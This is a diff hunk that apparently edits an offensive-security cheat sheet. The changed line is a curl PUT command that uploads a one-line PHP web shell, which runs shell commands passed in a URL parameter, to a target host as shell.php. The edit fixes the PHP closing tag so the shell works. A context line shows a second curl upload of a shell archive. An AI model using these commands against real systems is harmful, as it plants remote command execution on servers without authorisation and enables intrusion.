@@ -164,7 +164,7 @@ curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "
 
 #### PUTing File on the Webhost via PUT verb
 ```bash
-curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.2.99/shell.php
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 ```
 
 #### Generating Payload Pattern & Calculating Offset
